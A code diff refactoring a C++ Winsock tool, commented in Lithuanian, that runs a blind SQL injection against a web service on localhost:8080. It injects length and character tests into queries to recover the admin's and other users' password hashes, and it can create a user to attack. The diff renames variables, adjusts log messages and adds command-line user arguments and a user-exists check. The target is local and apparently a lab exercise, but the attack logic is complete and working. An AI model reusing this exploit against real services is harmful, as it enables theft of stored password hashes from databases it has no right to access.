@@ -31,12 +31,12 @@ int getHttpStatusCode(const string& response) {
         return -1;
     }
 
-    size_t codePos = response.find(' ', start);
-    if (codePos == string::npos || codePos + 3 >= response.size()) {
+    size_t codePosition = response.find(' ', start);
+    if (codePosition == string::npos || codePosition + 3 >= response.size()) {
         return -1;
     }
 
-    return stoi(response.substr(codePos + 1, 3));
+    return stoi(response.substr(codePosition + 1, 3));
 }
 
 string getHttpBody(const string& response) {
@@ -49,12 +49,12 @@ string getHttpBody(const string& response) {
 
 // Funkcija HTTP užklausai siųsti
 string sendRequest(const string& request) {
-    WSADATA wsa;
+    WSADATA winSockData;
     SOCKET s;
     struct sockaddr_in server;
     char buffer[8192];
 
-    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+    if (WSAStartup(MAKEWORD(2, 2), &winSockData) != 0) {
         cout << "[-] WSAStartup failed\n";
         return "";
     }
@@ -71,7 +71,7 @@ string sendRequest(const string& request) {
     server.sin_port = htons(8080);
 
     if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
-        cout << "[-] Connection failed to 127.0.0.1:8080 (" << WSAGetLastError() << ")\n";
+        cout << "[!] Connection failed to 127.0.0.1:8080 (" << WSAGetLastError() << ")\n";
         closesocket(s);
         WSACleanup();
         return "";
@@ -82,7 +82,7 @@ string sendRequest(const string& request) {
     while (totalSent < requestSize) {
         int sent = send(s, request.c_str() + totalSent, requestSize - totalSent, 0);
         if (sent == SOCKET_ERROR) {
-            cout << "[-] Send failed (" << WSAGetLastError() << ")\n";
+            cout << "[!] Send failed (" << WSAGetLastError() << ")\n";
             closesocket(s);
             WSACleanup();
             return "";
@@ -94,7 +94,7 @@ string sendRequest(const string& request) {
     while (true) {
         int recv_size = recv(s, buffer, sizeof(buffer), 0);
         if (recv_size == SOCKET_ERROR) {
-            cout << "[-] Receive failed (" << WSAGetLastError() << ")\n";
+            cout << "[!] Receive failed (" << WSAGetLastError() << ")\n";
             closesocket(s);
             WSACleanup();
             return "";
@@ -113,7 +113,7 @@ string sendRequest(const string& request) {
 
 // Hash ilgio radimas
 int findHashLength(string user) {
-    for (int len = 1; len <= 64; len++) {
+    for (int len = 1; len <= 40; len++) {
 
         string payload = user + "' AND length(password)=" + to_string(len) + " -- ";
         string encodedPayload = urlEncode(payload);
@@ -125,13 +125,13 @@ int findHashLength(string user) {
 
         string response = sendRequest(request);
         if (response.empty()) {
-            cout << "[-] HTTP request failed while checking hash length\n";
+            cout << "[!] HTTP request failed while checking hash length\n";
             return -1;
         }
 
         int statusCode = getHttpStatusCode(response);
         if (statusCode != 200) {
-            cout << "[-] Unexpected HTTP status while checking hash length: " << statusCode << endl;
+            cout << "[!] Unexpected HTTP status while checking hash length: " << statusCode << endl;
             return -1;
         }
 
@@ -165,13 +165,13 @@ string extractHash(string user, int length) {
 
             string response = sendRequest(request);
             if (response.empty()) {
-                cout << "\n[-] HTTP request failed while extracting hash\n";
+                cout << "\n[!] HTTP request failed while extracting hash\n";
                 return "";
             }
 
             int statusCode = getHttpStatusCode(response);
             if (statusCode != 200) {
-                cout << "\n[-] Unexpected HTTP status while extracting hash: " << statusCode << endl;
+                cout << "\n[!] Unexpected HTTP status while extracting hash: " << statusCode << endl;
                 return "";
             }
 
@@ -197,16 +197,26 @@ string extractHash(string user, int length) {
 }
 
 // Naujo vartotojo sukūrimas
-bool createUser() {
+bool createUser(const string& userName,
+                const string& firstName,
+                const string& lastName,
+                const string& password) {
 
-    string json = "{\"userName\":\"alex1\",\"userFName\":\"Alexander\",\"userLName\":\"Bob\",\"password\":\"guessme\"}";
+    string json = "{"
+        "\"userName\":\"" + userName + "\","
+        "\"userFName\":\"" + firstName + "\","
+        "\"userLName\":\"" + lastName + "\","
+        "\"password\":\"" + password + "\""
+    "}";
 
     string request =
         "POST /users HTTP/1.1\r\n"
         "Host: localhost:8080\r\n"
         "Content-Type: application/json\r\n"
-        "Content-Length: " + to_string(json.length()) + "\r\n"
-        "Connection: close\r\n\r\n" +
+        "Accept: application/json\r\n"
+        "Content-Length: " + to_string(json.size()) + "\r\n"
+        "Connection: close\r\n"
+        "\r\n" +
         json;
 
     string response = sendRequest(request);
@@ -218,41 +228,73 @@ bool createUser() {
     int statusCode = getHttpStatusCode(response);
     string body = getHttpBody(response);
 
-    if (statusCode == 201) {
-        cout << "[+] User created successfully (HTTP 201)\n";
+    if (statusCode >= 200 && statusCode < 300) {
+        cout << "[+] User created successfully (HTTP " << statusCode << ")\n";
         return true;
     }
 
     cout << "[-] User creation failed (HTTP " << statusCode << ")\n";
-    cout << "[-] Response body: " << body << endl;
+    cout << "    Response body: " << body << endl;
     return false;
 }
+bool userExists(const string& user) {
 
-// MAIN
-int main() {
+    string encodedUser = user;
 
-    cout << "=== ADMIN HASH ===\n";
+    string request =
+        "GET /users?username=" + encodedUser + " HTTP/1.1\r\n"
+        "Host: localhost:8080\r\n"
+        "Connection: close\r\n\r\n";
 
-    string user = "admin";
-
-    int len = findHashLength(user);
-    if (len == -1) return 1;
-
-    string hash = extractHash(user, len);
-    if (hash.empty()) return 1;
-
-    cout << "\n[+] Admin hash: " << hash << endl;
-
-
-    cout << "\n=== KURIAM NAUJA VARTOTOJA ===\n";
-    if (!createUser()) {
-        cout << "[!] Tesiama toliau be naujo vartotojo sukurimo\n";
+    string response = sendRequest(request);
+    if (response.empty()) {
+        cout << "[-] Failed to check if user exists\n";
+        return false;
     }
 
+    int statusCode = getHttpStatusCode(response);
+    if (statusCode != 200) {
+        cout << "[-] Unexpected HTTP status while checking user: " << statusCode << endl;
+        return false;
+    }
 
-    cout << "\n=== NAUJO USER HASH ===\n";
+    string body = getHttpBody(response);
+    string bodyLower = body;
+    for (char &c : bodyLower) c = tolower(c);
 
-    string newUser = "alex1";
+    return bodyLower.find("user exists") != string::npos;
+}
+int main(int argc, char* argv[]) {
+
+    if (argc < 3) {
+        cout << "Naudojimas: " << argv[0] << " <existingUser> <newUser>\n";
+        return 1;
+    }
+
+    string existingUser = argv[1];
+    string newUser = argv[2];
+    if(userExists(existingUser)){
+    cout << "=== egzistuojancio vartotojo slaptazodzio hash ===\n";
+
+    int len = findHashLength(existingUser);
+    if (len == -1) return 1;
+
+    string hash = extractHash(existingUser, len);
+    if (hash.empty()) return 1;
+
+    cout << "\n[+] " << existingUser << " slaptazodzio hash: " << hash << endl;
+    }
+    else cout << "[-] Vartotojas " << existingUser << " neegzistuoja" << endl;
+    if(userExists(newUser) == false){
+    cout << "\n=== naujo vartotojo kurimas ===\n";
+
+    if (!createUser(newUser, "Alexander", "Bob", "guessme")) {
+        cout << "[!] Tęsiama toliau be naujo vartotojo sukūrimo\n";
+    }
+    }
+    else cout << "[!] Vartotojas " << newUser << " jau egzistuoja" << endl;
+    cout << endl;
+    cout << "\n=== naujo vartotojo slaptazodzio hash ===\n";
 
     int newLen = findHashLength(newUser);
     if (newLen == -1) return 1;
@@ -260,7 +302,7 @@ int main() {
     string newHash = extractHash(newUser, newLen);
     if (newHash.empty()) return 1;
 
-    cout << "\n[+] New user hash: " << newHash << endl;
+    cout << "\n[+] " << newUser << " slaptazodzio hash: " << newHash << endl;
 
     return 0;
 }
